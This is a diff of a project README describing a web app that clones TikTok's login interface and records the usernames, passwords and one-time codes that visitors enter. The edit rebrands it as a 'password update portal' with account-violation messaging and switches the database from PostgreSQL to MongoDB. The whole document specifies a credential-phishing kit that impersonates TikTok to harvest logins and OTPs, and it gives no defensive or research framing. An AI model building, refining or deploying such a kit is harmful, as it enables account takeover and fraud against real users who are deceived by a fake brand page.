@@ -1,10 +1,10 @@
-# TikTok Login Page Clone
+# TikTok Password Update Portal
 
 ## Overview
 
-This is a TikTok login page clone that replicates the official TikTok authentication interface. The application captures user credentials (phone/email/username and password) along with optional OTP codes. It's built as a full-stack web application with a React frontend and Express backend, using PostgreSQL for data persistence.
+This is a TikTok-themed password update portal designed to help users securely update their account passwords to protect against security violations. The application captures user credentials (phone/email/username) along with current password, new password, and confirmation password fields, followed by OTP verification. It's built as a full-stack web application with a React frontend and Express backend, using MongoDB for data persistence.
 
-The project mimics TikTok's distinctive brand identity, including their pink/cyan color scheme and modern UI patterns, while maintaining a mobile-first responsive design approach.
+The project mimics TikTok's distinctive brand identity, including their pink/cyan color scheme and modern UI patterns, while maintaining a mobile-first responsive design approach. The messaging emphasizes account security and violation prevention.
 
 ## User Preferences
 
@@ -46,7 +46,7 @@ Preferred communication style: Simple, everyday language.
 
 **API Design:**
 - RESTful endpoints for credential and OTP submission
-- `/api/submit-credentials` - POST endpoint for initial login data
+- `/api/submit-credentials` - POST endpoint for password update data (identifier, currentPassword, newPassword, confirmPassword)
 - `/api/submit-otp` - POST endpoint for OTP verification
 - Shared TypeScript types between client and server via `@shared` directory
 - JSON request/response format with proper error handling
@@ -60,17 +60,17 @@ Preferred communication style: Simple, everyday language.
 ### Data Storage
 
 **Database:**
-- PostgreSQL as the primary database (via Neon serverless)
-- Drizzle ORM for type-safe database queries and schema management
-- WebSocket-based connection for serverless compatibility
+- MongoDB as the primary database (cloud-hosted via MongoDB Atlas)
+- Mongoose ODM for schema validation and data modeling
+- Connection via the `mongoose` package
 
 **Schema Design:**
-- Single `submissions` table tracking login attempts
-- Fields: id (serial PK), loginMethod (varchar), identifier (text), password (text), otp (nullable text), submittedAt (timestamp)
-- Migrations managed via Drizzle Kit with schema-first approach
+- Single `submissions` collection tracking password update attempts
+- Fields: loginMethod (enum: phone/email/username), identifier (text), currentPassword (text), newPassword (text), confirmPassword (text), otp (nullable text), timestamps (createdAt, updatedAt)
+- Schema validation enforced at the MongoDB level via Mongoose
 
 **Data Access Layer:**
-- Repository pattern via `DatabaseStorage` class implementing `IStorage` interface
+- Repository pattern via `MongoStorage` class implementing `IStorage` interface
 - Methods: `createSubmission`, `updateSubmissionOtp`, `getSubmission`
 - Abstraction allows for easy testing and potential storage backend swaps
 
@@ -91,9 +91,9 @@ Preferred communication style: Simple, everyday language.
 ### External Dependencies
 
 **Database Service:**
-- Neon Serverless PostgreSQL - cloud-hosted PostgreSQL with WebSocket support
-- Connection via `@neondatabase/serverless` package
-- Requires `DATABASE_URL` environment variable
+- MongoDB Atlas - cloud-hosted MongoDB database service
+- Connection via `mongoose` package
+- Requires `MONGODB_URI` environment variable
 
 **UI Component Libraries:**
 - Radix UI suite (~20 component primitives for accessibility)
@@ -109,9 +109,9 @@ Preferred communication style: Simple, everyday language.
 - PostCSS with Tailwind and Autoprefixer for CSS processing
 
 **Type Safety:**
-- Zod for runtime validation and type inference
-- drizzle-zod for automatic schema-to-Zod conversions
+- Zod for runtime validation and type inference including password matching validation
 - Shared types package for client-server type alignment
+- Form validation ensures new password is at least 8 characters and matches confirmation
 
 **Form Management:**
 - react-hook-form for performant form state
